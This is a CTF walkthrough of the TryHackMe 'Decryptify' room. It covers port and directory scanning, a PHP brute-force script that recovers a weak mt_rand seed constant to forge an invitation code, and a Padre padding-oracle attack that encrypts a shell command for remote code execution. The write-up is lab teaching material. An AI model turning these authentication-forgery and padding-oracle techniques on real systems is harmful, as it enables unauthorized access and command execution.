---
clayout: ctf
title: Decryptify
type: TryHackMe
date: 2025-04-12
level: Medium
icon: /ctf/tryhackme/decryptify/icon-room.png
image: /ctf/tryhackme/decryptify/icon-room.png
banner: /ctf/tryhackme/decryptify/banner-room.png
description: Use your exploitation skills to uncover encrypted keys and get RCE.
ctf-link: https://tryhackme.com/room/decryptify
---

## Challenge Overview

This challenge involves analyzing a vulnerable web application hosted on a target machine. The goal is to enumerate services, analyze web application components, bypass authentication mechanisms, and ultimately exploit a cryptographic vulnerability to achieve Remote Code Execution (RCE) and capture flags.

## Enumeration Phase

### Nmap – Network Scanning

We begin by performing a comprehensive port and service scan to identify open ports on the target system.

```bash
nmap -sV -sC -oN nmap/initial.nmap 10.10.10.10
```

**Scan Results:**

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e539fe7f1243aad8147bfb63ffa730ab (RSA)
|   256 b0d6ce37b5604f0908fc589ec46f649f (ECDSA)
|_  256 91d40396111acefe8cc6f99b8a308b0b (ED25519)
1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: Login - Decryptify
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

**Findings:**

- **SSH (22/tcp)**: OpenSSH 8.2p1
- **HTTP (1337/tcp)**: Apache web server with a login page titled *"Decryptify"*

## Web Application Analysis

### Initial Reconnaissance

Navigating to `http://10.10.10.10:1337/` reveals a login page requesting an email/username and an invitation code.

![Login Page](/ctf/tryhackme/decryptify/login.png)

Reviewing the page source reveals the presence of a JavaScript file: `/js/api.js`.

![Source Code](/ctf/tryhackme/decryptify/source-code.png)

This script appears to be performing some form of processing. When executed locally, it outputs:

```text
H7gY2tJ9wQzD4rS1
```

This string seems to function as a password for accessing the API documentation via a button on the page:

![API Login](/ctf/tryhackme/decryptify/api-login.png)

Using the value as a password grants access to the documentation:

![API Documentation](/ctf/tryhackme/decryptify/api-documentation.png)

Within this documentation, we find the function responsible for generating invitation codes.

```php
function calculate_seed_value($email, $constant_value) {
    $email_length = strlen($email);
    $email_hex = hexdec(substr($email, 0, 8));
    $seed_value = hexdec($email_length + $constant_value + $email_hex);
    return $seed_value;
}

$seed_value = calculate_seed_value($email, $constant_value);
mt_srand($seed_value);
$random = mt_rand();
$invite_code = base64_encode($random);
```

This is critical for crafting custom invitation codes.

## Directory Enumeration

To uncover hidden directories, we use **Gobuster**:

```bash
gobuster dir -u http://10.10.10.10:1337/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![Gobuster Output](/ctf/tryhackme/decryptify/gobuster.png)

### Discovery: `/logs`

We discover a `/logs` directory containing an `app.log` file.

![Logs Directory](/ctf/tryhackme/decryptify/logs.png)

Reviewing the log contents:

![App Log](/ctf/tryhackme/decryptify/app-log.png)

We extract a valid invitation code for the user `alpha@fake.thm`:

```text
Invite code: MTM0ODMzNzEyMg==
```

However, logs also indicate that this account is deactivated:

```text
User alpha@fake.thm deactivated
```

Another user `hello@fake.thm` has since been created. We aim to generate a new invitation code for this user using the function previously found.

## Exploiting the Invitation Code Generation

To do this, we first brute-force the constant value used in the seed calculation for the known user `alpha@fake.thm`.

```php
// Brute-forcing constant value
$email = "alfa@fake.thm";
$invite_code_given = "MTM0ODMzNzEyMg==";
for ($constant_value = 0; $constant_value < 999999999; $constant_value++) {
    $seed_value = calculate_seed_value($email, $constant_value);
    mt_srand($seed_value);
    $random = mt_rand();
    $invite_code = base64_encode($random);

    if ($invite_code === $invite_code_given) {
        echo "Found constant value: " . $constant_value;
        break;
    }
}
```

**Result:**

```bash
Found constant value: 99999
```

### Generating a Valid Invitation Code for `hello@fake.thm`

Now that we have the constant, we generate an invite code for the new user.

```php
$email = "hello@fake.thm";
$constant_value = 99999;

$seed_value = calculate_seed_value($email, $constant_value);
mt_srand($seed_value);
$random = mt_rand();
$invite_code = base64_encode($random);

echo $invite_code;
```

**Output:**

```bash
NDYxNTg5ODkx
```

We can now authenticate successfully.

## Post-Authentication Exploration

After logging in, we are redirected to a dashboard.

![Dashboard](/ctf/tryhackme/decryptify/dashboard.png)

Inspecting the page’s source code reveals a hidden input field with a suspiciously encoded value.

```html
<input type="hidden" name="date" value="ANwAS6sthVRXTaikiT5OiBUZ8DqXsCA+bgJY3N1B0fI=">
```

When submitting a request with an empty `date` parameter, we get the following error:

![Error](/ctf/tryhackme/decryptify/error.png)

The message:

```
Padding error: error:0606506D:digital envelope routines:EVP_DecryptFinal_ex:wrong final block length
```

This is a well-known error message associated with **AES encryption padding issues**, which can potentially indicate a **padding oracle vulnerability**.

## Exploiting Padding Oracle for Remote Code Execution

Using the [Padre](https://github.com/glebarez/padre/releases/tag/v2.1.0) tool, we attempt to exploit this vulnerability:

```bash
./padre-darwin-amd64 \
  -cookie 'PHPSESSID=p4sitftkdolatjl89fplgipsh0; role=d057af5933d8acebfe290fe2bbd540e08a2a81a22eff55969a89a7dbe84fb98cd6cbda066ed79220eba70afb9b3d4e0d' \
  -u 'http://10.10.165.104:1337/dashboard.php?date=$' \
  -enc "cat /home/ubuntu/flag.txt"
```

**Tool Output:**

```bash
[i] padre is on duty
[i] using concurrency (http connections): 30
[+] successfully detected padding oracle
[+] detected block length: 8
[!] mode: encrypt
[1/1] 8ToOYHlh0PuGepheR0TEN66XK6YqUx4yZQWGJFft495lbmJyaWVhcw==                                                                                                                         [40/40] | reqs: 4435 (492/sec)
```

This successfully returns the contents of the flag file.

![Flag Output](/ctf/tryhackme/decryptify/flag.png)
